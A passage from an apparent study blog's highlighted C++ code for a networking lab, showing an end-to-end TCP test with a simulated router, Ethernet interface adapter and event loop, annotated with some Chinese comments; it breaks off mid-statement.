class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">EthernetAddress <span class="hljs-title">random_host_ethernet_address</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    EthernetAddress addr;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;byte : addr) &#123;<br>        byte = <span class="hljs-built_in">random_device</span>()(); <span class="hljs-comment">// use a random local Ethernet address</span><br>    &#125;<br>    addr.<span class="hljs-built_in">at</span>(<span class="hljs-number">0</span>) |= <span class="hljs-number">0x02</span>; <span class="hljs-comment">// &quot;10&quot; in last two binary digits marks a private Ethernet address</span><br>    addr.<span class="hljs-built_in">at</span>(<span class="hljs-number">0</span>) &amp;= <span class="hljs-number">0xfe</span>;<br><br>    <span class="hljs-keyword">return</span> addr;<br>&#125;<br><br><span class="hljs-function">EthernetAddress <span class="hljs-title">random_router_ethernet_address</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    EthernetAddress addr;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;byte : addr) &#123;<br>        byte = <span class="hljs-built_in">random_device</span>()(); <span class="hljs-comment">// use a random local Ethernet address</span><br>    &#125;<br>    addr.<span class="hljs-built_in">at</span>(<span class="hljs-number">0</span>) = <span class="hljs-number">0x02</span>; <span class="hljs-comment">// &quot;10&quot; in last two binary digits marks a private Ethernet address</span><br>    addr.<span class="hljs-built_in">at</span>(<span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;<br>    addr.<span class="hljs-built_in">at</span>(<span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">return</span> addr;<br>&#125;<br><br><span class="hljs-function">optional&lt;EthernetFrame&gt; <span class="hljs-title">maybe_receive_frame</span><span class="hljs-params">(FileDescriptor &amp;fd)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">strs</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span>;<br>    strs.<span class="hljs-built_in">at</span>(<span class="hljs-number">0</span>).<span class="hljs-built_in">resize</span>(EthernetHeader::LENGTH);<br>    strs.<span class="hljs-built_in">at</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">resize</span>(IPv4Header::LENGTH);<br>    fd.<span class="hljs-built_in">read</span>(strs);<br><br>    EthernetFrame frame;<br>    vector&lt;Buffer&gt; buffers;<br>    ranges::<span class="hljs-built_in">transform</span>(strs, <span class="hljs-built_in">back_inserter</span>(buffers), <span class="hljs-built_in">identity</span>());<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> <span class="hljs-built_in">parse</span>(frame, buffers)) &#123;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> frame;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkInterfaceAdapter</span> : <span class="hljs-keyword">public</span> TCPOverIPv4Adapter<br>&#123;<br>  <span class="hljs-keyword">private</span>:<br>    NetworkInterface _interface;<br>    Address _next_hop;<br>    pair&lt;FileDescriptor, FileDescriptor&gt; _data_socket_pair = <span class="hljs-built_in">socket_pair_helper</span>(SOCK_DGRAM);<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">send_pending</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">auto</span> frame = _interface.<span class="hljs-built_in">maybe_send</span>()) &#123;<br>            _data_socket_pair.first.<span class="hljs-built_in">write</span>(<span class="hljs-built_in">serialize</span>(frame.<span class="hljs-built_in">value</span>()));<br>        &#125;<br>    &#125;<br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">NetworkInterfaceAdapter</span>(<span class="hljs-type">const</span> Address &amp;ip_address, <span class="hljs-type">const</span> Address &amp;next_hop) <span class="hljs-comment">// NOLINT(*-swappable-*)</span><br>        : _interface(<span class="hljs-built_in">random_host_ethernet_address</span>(), ip_address), _next_hop(next_hop)<br>    &#123;&#125;<br><br>    <span class="hljs-function">optional&lt;TCPSegment&gt; <span class="hljs-title">read</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">auto</span> frame_opt = <span class="hljs-built_in">maybe_receive_frame</span>(_data_socket_pair.first);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> frame_opt) &#123;<br>            <span class="hljs-keyword">return</span> &#123;&#125;;<br>        &#125;<br>        EthernetFrame frame = <span class="hljs-built_in">move</span>(frame_opt.<span class="hljs-built_in">value</span>());<br><br>        <span class="hljs-comment">// Give the frame to the NetworkInterface. Get back an Internet datagram if frame was carrying one.</span><br>        optional&lt;InternetDatagram&gt; ip_dgram = _interface.<span class="hljs-built_in">recv_frame</span>(frame);<br><br>        <span class="hljs-comment">// The incoming frame may have caused the NetworkInterface to send a frame</span><br>        <span class="hljs-built_in">send_pending</span>();<br><br>        <span class="hljs-comment">// Try to interpret IPv4 datagram as TCP</span><br>        <span class="hljs-keyword">if</span> (ip_dgram) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">unwrap_tcp_in_ip</span>(ip_dgram.<span class="hljs-built_in">value</span>());<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">write</span><span class="hljs-params">(TCPSegment &amp;seg)</span></span><br><span class="hljs-function">    </span>&#123;<br>        _interface.<span class="hljs-built_in">send_datagram</span>(<span class="hljs-built_in">wrap_tcp_in_ip</span>(seg), _next_hop);<br>        <span class="hljs-built_in">send_pending</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">tick</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">size_t</span> ms_since_last_tick)</span></span><br><span class="hljs-function">    </span>&#123;<br>        _interface.<span class="hljs-built_in">tick</span>(ms_since_last_tick);<br>        <span class="hljs-built_in">send_pending</span>();<br>    &#125;<br>    <span class="hljs-function">NetworkInterface &amp;<span class="hljs-title">interface</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> _interface; &#125;<br><br>    <span class="hljs-function">FileDescriptor &amp;<span class="hljs-title">fd</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> _data_socket_pair.first; &#125;<br>    <span class="hljs-function">FileDescriptor &amp;<span class="hljs-title">frame_fd</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> _data_socket_pair.second; &#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TCPSocketEndToEnd</span> : <span class="hljs-keyword">public</span> TCPMinnowSocket&lt;NetworkInterfaceAdapter&gt;<br>&#123;<br>    Address _local_address;<br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">TCPSocketEndToEnd</span>(<span class="hljs-type">const</span> Address &amp;ip_address, <span class="hljs-type">const</span> Address &amp;next_hop)<br>        : <span class="hljs-built_in">TCPMinnowSocket</span>&lt;NetworkInterfaceAdapter&gt;(<span class="hljs-built_in">NetworkInterfaceAdapter</span>(ip_address, next_hop)),<br>          _local_address(ip_address)<br>    &#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">connect</span><span class="hljs-params">(<span class="hljs-type">const</span> Address &amp;address)</span></span><br><span class="hljs-function">    </span>&#123;<br>        FdAdapterConfig multiplexer_config;<br><br>        _local_address = Address &#123;_local_address.<span class="hljs-built_in">ip</span>(), <span class="hljs-built_in">uint16_t</span>(<span class="hljs-built_in">random_device</span>()())&#125;;<br>        cerr &lt;&lt; <span class="hljs-string">&quot;DEBUG: Connecting from &quot;</span> &lt;&lt; _local_address.<span class="hljs-built_in">to_string</span>() &lt;&lt; <span class="hljs-string">&quot;...\n&quot;</span>;<br>        multiplexer_config.source = _local_address;<br>        multiplexer_config.destination = address;<br><br>        TCPMinnowSocket&lt;NetworkInterfaceAdapter&gt;::<span class="hljs-built_in">connect</span>(&#123;&#125;, multiplexer_config);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bind</span><span class="hljs-params">(<span class="hljs-type">const</span> Address &amp;address)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (address.<span class="hljs-built_in">ip</span>() != _local_address.<span class="hljs-built_in">ip</span>()) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">runtime_error</span>(<span class="hljs-string">&quot;Cannot bind to &quot;</span> + address.<span class="hljs-built_in">to_string</span>());<br>        &#125;<br>        _local_address = Address &#123;_local_address.<span class="hljs-built_in">ip</span>(), address.<span class="hljs-built_in">port</span>()&#125;;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">listen_and_accept</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        FdAdapterConfig multiplexer_config;<br>        multiplexer_config.source = _local_address;<br>        TCPMinnowSocket&lt;NetworkInterfaceAdapter&gt;::<span class="hljs-built_in">listen_and_accept</span>(&#123;&#125;, multiplexer_config);<br>    &#125;<br><br>    <span class="hljs-function">NetworkInterfaceAdapter &amp;<span class="hljs-title">adapter</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> _datagram_adapter; &#125;<br>&#125;;<br><br><span class="hljs-comment">// NOLINTBEGIN(*-cognitive-complexity)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">program_body</span><span class="hljs-params">(<span class="hljs-type">bool</span> is_client, <span class="hljs-type">const</span> string &amp;bounce_host, <span class="hljs-type">const</span> string &amp;bounce_port, <span class="hljs-type">const</span> <span class="hljs-type">bool</span> debug)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// UDP socket，用于接收IP发送的IP datagram</span><br>    UDPSocket internet_socket;<br>    Address bounce_address &#123;bounce_host, bounce_port&#125;;<br><br>    <span class="hljs-comment">/* let bouncer know where we are */</span><br>    internet_socket.<span class="hljs-built_in">sendto</span>(bounce_address, <span class="hljs-string">&quot;&quot;</span>);<br>    internet_socket.<span class="hljs-built_in">sendto</span>(bounce_address, <span class="hljs-string">&quot;&quot;</span>);<br>    internet_socket.<span class="hljs-built_in">sendto</span>(bounce_address, <span class="hljs-string">&quot;&quot;</span>);<br>    internet_socket.<span class="hljs-built_in">connect</span>(bounce_address);<br><br>    <span class="hljs-comment">/* set up the router */</span><br>    Router router;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> host_side &#123;&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> internet_side &#123;&#125;;<br><br>  <span class="hljs-comment">// 分别为client和server添加路由，此实验仅两个转发路由</span><br>    <span class="hljs-keyword">if</span> (is_client) &#123;<br>        host_side = router.<span class="hljs-built_in">add_interface</span>(&#123;<span class="hljs-built_in">random_router_ethernet_address</span>(), Address &#123;<span class="hljs-string">&quot;192.168.0.1&quot;</span>&#125;&#125;);<br>        internet_side = router.<span class="hljs-built_in">add_interface</span>(&#123;<span class="hljs-built_in">random_router_ethernet_address</span>(), Address &#123;<span class="hljs-string">&quot;10.0.0.192&quot;</span>&#125;&#125;);<br>        router.<span class="hljs-built_in">add_route</span>(Address &#123;<span class="hljs-string">&quot;192.168.0.0&quot;</span>&#125;.<span class="hljs-built_in">ipv4_numeric</span>(), <span class="hljs-number">16</span>, &#123;&#125;, host_side);<br>        router.<span class="hljs-built_in">add_route</span>(Address &#123;<span class="hljs-string">&quot;10.0.0.0&quot;</span>&#125;.<span class="hljs-built_in">ipv4_numeric</span>(), <span class="hljs-number">8</span>, &#123;&#125;, internet_side);<br>        router.<span class="hljs-built_in">add_route</span>(Address &#123;<span class="hljs-string">&quot;172.16.0.0&quot;</span>&#125;.<span class="hljs-built_in">ipv4_numeric</span>(), <span class="hljs-number">12</span>, Address &#123;<span class="hljs-string">&quot;10.0.0.172&quot;</span>&#125;, internet_side);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        host_side = router.<span class="hljs-built_in">add_interface</span>(&#123;<span class="hljs-built_in">random_router_ethernet_address</span>(), Address &#123;<span class="hljs-string">&quot;172.16.0.1&quot;</span>&#125;&#125;);<br>        internet_side = router.<span class="hljs-built_in">add_interface</span>(&#123;<span class="hljs-built_in">random_router_ethernet_address</span>(), Address &#123;<span class="hljs-string">&quot;10.0.0.172&quot;</span>&#125;&#125;);<br>        router.<span class="hljs-built_in">add_route</span>(Address &#123;<span class="hljs-string">&quot;172.16.0.0&quot;</span>&#125;.<span class="hljs-built_in">ipv4_numeric</span>(), <span class="hljs-number">12</span>, &#123;&#125;, host_side);<br>        router.<span class="hljs-built_in">add_route</span>(Address &#123;<span class="hljs-string">&quot;10.0.0.0&quot;</span>&#125;.<span class="hljs-built_in">ipv4_numeric</span>(), <span class="hljs-number">8</span>, &#123;&#125;, internet_side);<br>        router.<span class="hljs-built_in">add_route</span>(Address &#123;<span class="hljs-string">&quot;192.168.0.0&quot;</span>&#125;.<span class="hljs-built_in">ipv4_numeric</span>(), <span class="hljs-number">16</span>, Address &#123;<span class="hljs-string">&quot;10.0.0.192&quot;</span>&#125;, internet_side);<br>    &#125;<br><br>    <span class="hljs-comment">/* set up the client */</span><br>  <span class="hljs-comment">// 建立TCPSocketEndToEnd对象，这个对象负责了连接等过程</span><br>    TCPSocketEndToEnd sock = is_client ? TCPSocketEndToEnd &#123;Address &#123;<span class="hljs-string">&quot;192.168.0.50&quot;</span>&#125;, Address &#123;<span class="hljs-string">&quot;192.168.0.1&quot;</span>&#125;&#125;<br>                                       : TCPSocketEndToEnd &#123;Address &#123;<span class="hljs-string">&quot;172.16.0.100&quot;</span>&#125;, Address &#123;<span class="hljs-string">&quot;172.16.0.1&quot;</span>&#125;&#125;;<br><br>    atomic&lt;<span class="hljs-type">bool</span>&gt; exit_flag &#123;&#125;;<br><br>    queue&lt;EthernetFrame&gt; router_to_host;<br>    queue&lt;EthernetFrame&gt; router_to_internet;<br><br>    <span class="hljs-comment">/* set up the network */</span><br>  <span class="hljs-comment">// event循环，分别是</span><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  1. client =&gt; router</span><br><span class="hljs-comment">  2. router =&gt; client</span><br><span class="hljs-comment">  3. router =&gt; Internet</span><br><span class="hljs-comment">  4. Internet =&gt; router</span><br><span class="hljs-comment">  在触发对应的作执行相应的回调函数</span><br><span class="hljs-comment">  */</span><br>    <span class="hljs-function">thread <span class="hljs-title">network_thread</span><span class="hljs-params">([&amp;]() &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">try</span> &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">            EventLoop event_loop;</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-comment">// Frames from host to router</span></span></span><br><span class="hljs-params"><span class="hljs-function">            event_loop.add_rule(<span class="hljs-string">&quot;frames from host to router&quot;</span>, sock.adapter().frame_fd(), Direction::In, [&amp;] &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-comment">// 从socket接收以太网frame</span></span></span><br><span class="hljs-params"><span class="hljs-function">              <span class="hljs-keyword">auto</span> frame_opt = maybe_receive_frame(sock.adapter().frame_fd());</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> frame_opt) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-keyword">return</span>;</span></span><br><span class="hljs-params"><span class="hljs-function">                &#125;</span></span><br><span class="hljs-params"><span class="hljs-function">                EthernetFrame frame = move(frame_opt.value());</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">if</span> (debug) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                    cerr &lt;&lt; <span class="hljs-string">&quot;     Host-&gt;router:     &quot;</span> &lt;&lt; summary(frame) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;</span></span><br><span class="hljs-params"><span class="hljs-function">                &#125;</span></span><br><span class="hljs-params"><span class="hljs-function">              <span class="hljs-comment">//以太网链路层 =&gt; IP层</span></span></span><br><span class="hljs-params"><span class="hljs-function">                router.interface(host_side).recv_frame(frame);</span></span><br><span class="hljs-params"><span class="hljs-function">              <span class="hljs-comment">// 为IP层路由</span></span></span><br><span class="hljs-params"><span class="hljs-function">                router.route();</span></span><br><span class="hljs-params"><span class="hljs-function">            &#125;);</span></span><br><span class="hljs-params"><span class="hljs-function"></span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-comment">// Frames from router to host</span></span></span><br><span class="hljs-params"><span class="hljs-function">            event_loop.add_rule(</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-string">&quot;frames from router to host&quot;</span>, sock.adapter().frame_fd(), Direction::Out,</span></span><br><span class="hljs-params"><span class="hljs-function">                [&amp;] &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                  <span class="hljs-comment">// f是要发送给主机的frame</span></span></span><br><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-keyword">auto</span> &amp;f = router_to_host;</span></span><br><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-keyword">if</span> (debug) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                        cerr &lt;&lt; <span class="hljs-string">&quot;     Router-&gt;host:     &quot;</span> &lt;&lt; summary(f.front()) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;</span></span><br><span class="hljs-params"><span class="hljs-function">                    &#125;</span></span><br><span class="hljs-params"><span class="hljs-function">                  <span class="hljs-comment">// 写入socket</span></span></span><br><span class="hljs-params"><span class="hljs-function">                    sock.adapter().frame_fd().write(serialize(f.front()));</span></span><br><span class="hljs-params"><span class="hljs-function">                    f.pop();</span></span><br><span class="hljs-params"><span class="hljs-function">                &#125;,</span></span><br><span class="hljs-params"><span class="hljs-function">                [&amp;] &#123; <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> router_to_host.empty(); &#125;);</span></span><br><span class="hljs-params"><span class="hljs-function"></span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-comment">// Frames from router to Internet</span></span></span><br><span class="hljs-params"><span class="hljs-function">            event_loop.add_rule(</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-string">&quot;frames from router to Internet&quot;</span>, internet_socket, Direction::Out,</span></span><br><span class="hljs-params"><span class="hljs-function">                [&amp;] &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                  <span class="hljs-comment">// </span></span></span><br><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-keyword">auto</span> &amp;f = router_to_internet;</span></span><br><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-keyword">if</span> (debug) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                        cerr &lt;&lt; <span class="hljs-string">&quot;     Router-&gt;Internet: &quot;</span> &lt;&lt; summary(f.front()) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;</span></span><br><span class="hljs-params"><span class="hljs-function">                    &#125;</span></span><br><span class="hljs-params"><span class="hljs-function">                  <span class="hljs-comment">// IP =&gt; frame =&gt; internet_socket</span></span></span><br><span class="hljs-params"><span class="hljs-function">                    internet_socket.write(serialize(f.front()));</span></span><br><span class="hljs-params"><span class="hljs-function">                    f.pop();</span></span><br><span class="hljs-params"><span class="hljs-function">                &#125;,</span></span><br><span class="hljs-params"><span class="hljs-function">                [&amp;] &#123; <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> router_to_internet.empty(); &#125;);</span></span><br><span class="hljs-params"><span class="hljs-function"></span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-comment">// Frames from Internet to router</span></span></span><br><span class="hljs-params"><span class="hljs-function">            event_loop.add_rule(<span class="hljs-string">&quot;frames from Internet to router&quot;</span>, internet_socket, Direction::In, [&amp;] &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">auto</span> frame_opt = maybe_receive_frame(internet_socket);</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> frame_opt) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-keyword">return</span>;</span></span><br><span class="hljs-params"><span class="hljs-function">                &#125;</span></span><br><span class="hljs-params"><span class="hljs-function">                EthernetFrame frame = move(frame_opt.value());</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">if</span> (debug) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                    cerr &lt;&lt; <span class="hljs-string">&quot;     Internet-&gt;router: &quot;</span> &lt;&lt; summary(frame) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;</span></span><br><span class="hljs-params"><span class="hljs-function">                &#125;</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-comment">// frame =&gt; IP =&gt; internet_socket</span></span></span><br><span class="hljs-params"><span class="hljs-function">                router.interface(internet_side).recv_frame(frame);</span></span><br><span class="hljs-params"><span class="hljs-function">                router.route();</span></span><br><span class="hljs-params"><span class="hljs-function">            &#125;);</span></span><br><span class="hljs-params"><span class="hljs-function"></span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">if</span> (EventLoop::Result::Exit == event_loop.wait_next_event(<span class="hljs-number">10</span>)) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                    cerr &lt;&lt; <span class="hljs-string">&quot;Exiting...\n&quot;</span>;</span></span><br><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-keyword">return</span>;</span></span><br><span class="hljs-params"><span class="hljs-function">                &#125;</span></span><br><span class="hljs-params"><span class="hljs-function">                router.interface(host_side).tick(<span class="hljs-number">10</span>);</span></span><br><span class="hljs-params"><span class="hljs-function">                router.interface(internet_side).tick(<span class="hljs-number">10</span>);</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">while</span> (<span class="hljs-keyword">auto</span> frame = router.interface(host_side).maybe_send()) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                    router_to_host.push(move(frame.value()));</span></span><br><span class="hljs-params"><span class="hljs-function">                &#125;</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">while</span> (<span class="hljs-keyword">auto</span> frame = router.interface(internet_side).maybe_send()) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                    router_to_internet.push(move(frame.value()));</span></span><br><span class="hljs-params"><span class="hljs-function">                &#125;</span></span><br><span class="hljs-params"><span class="hljs-function"></span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">if</span> (exit_flag) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-keyword">return</span>;</span></span><br><span class="hljs-params"><span class="hljs-function">                &#125;</span></span><br><span class="hljs-params"><span class="hljs-function">            &#125;</span></span><br><span class="hljs-params"><span class="hljs-function">        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-type">const</span> exception &amp;e) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">            cerr &lt;&lt; <span class="hljs-string">&quot;Thread ending from exception: &quot;</span> &lt;&lt; e.what() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;</span></span><br><span class="hljs-params"><span class="hljs-function">        &#125;</span></span><br><span class="hljs-params"><span class="hljs-function">    &#125;)</span></span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (is_client) &#123;<br>            sock.<span class="hljs-built_in">connect</span>(Address &#123;<span class="hljs-string">&quot;172.16.0.100&quot;</span>, <span class="hljs-number">1234</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            sock.<span class="hljs-built_in">bind</span>(Address &#123;<span class="hljs-string">&quot;172.16.0.100&quot;</span>, <span class="hljs-number">1234</span>&#125;);<br>            sock.<span class="hljs-built_in">listen_and_accept</span>();<br>        &#125;<br><br>        <span class="hljs-built_in">bidirectional_stream_copy</span>(sock);<br>        sock.<span class="hljs-built_in">wait_until_closed</span>();<br>    &#125; <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> exception &amp;e) &#123;<br>        cerr &lt;&lt; <span class="hljs-string">&quot;Exception: &quot;</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br><br>    cerr &lt;&lt; <span class="hljs-string">&quot;Exiting... &quot;</span>;<br>    exit_flag = <span class="hljs-literal">true</span>;<br>    network_thread.<span class="hljs-built_in">join</span>();<br>    cerr &lt;&lt; <span class="hljs-string">&quot;done.\n&quot;</span>;<br>&#125;<br><span class="hljs-comment">// NOLINTEND(*-cognitive-complexity)</span><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c++">_eventloop.<span class="hljs-built_in">add_rule</span>(<br>  <span class="hljs-comment">// IP =&gt; TCP</span><br>    <span class="hljs-string">&quot;receive TCP segment from the network&quot;</span>, _datagram_adapter.<span class="hljs-built_in">fd</span>(), Direction::In,<br>    [&amp;] &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> seg = _datagram_adapter.<span class="hljs-built_in">read</span>()) &#123;<br>            _tcp-&gt;<span class="hljs-built_in">receive</span>(<span class="hljs-built_in">move</span>(seg.<span class="hljs-built_in">value</span>()));<br>            <span class="hljs-built_in">collect_segments</span>();<br>        &#125;<br><br>        <span class="hljs-comment">// debugging output:</span><br>        <span class="hljs-keyword">if</span> (_thread_data.<span class="hljs-built_in">eof</span>() <span class="hljs-keyword">and</span> _tcp.<span class="hljs-built_in">value</span>().<span class="hljs-built_in">sender</span>().<span class="hljs-built_in">sequence_numbers_in_flight</span>() == <span class="hljs-number">0</span><br>            <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> _fully_acked) &#123;<br>            cerr &lt;&lt; <span class="hljs-string">&quot;DEBUG: Outbound stream to &quot;</span> &lt;&lt; _datagram_adapter.<span class="hljs-built_in">config</span>().destination.<span class="hljs-built_in">to_string</span>()<br>                 &lt;&lt; <span class="hljs-string">&quot; has been fully acknowledged.\n&quot;</span>;<br>            _fully_acked = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;,<br>    [&amp;] &#123; <span class="hljs-keyword">return</span> _tcp-&gt;<span class="hljs-built_in">active</span>(); &#125;);<br><br><span class="hljs-comment">// rule 2: read from pipe into outbound buffer</span><br>_eventloop.<span class="hljs-built_in">add_rule</span>(<br>  <span class="hljs-comment">// prepare send</span><br>    <span class="hljs-string">&quot;push bytes to TCPPeer&quot;</span>, _thread_data, Direction::In,<br>    [&amp;] &#123;<br>        string data;<br>        data.<span class="hljs-built_in">resize</span>(_tcp-&gt;<span class="hljs-built_in">outbound_writer</span>().<span class="hljs-built_in">available_capacity</span>());<br>        _thread_data.<span class="hljs-built_in">read</span>(data);<br>        _tcp-&gt;<span class="hljs-built_in">outbound_writer</span>().<span class="hljs-built_in">push</span>(<span class="hljs-built_in">move</span>(data));<br><br>        <span class="hljs-keyword">if</span> (_thread_data.<span class="hljs-built_in">eof</span>()) 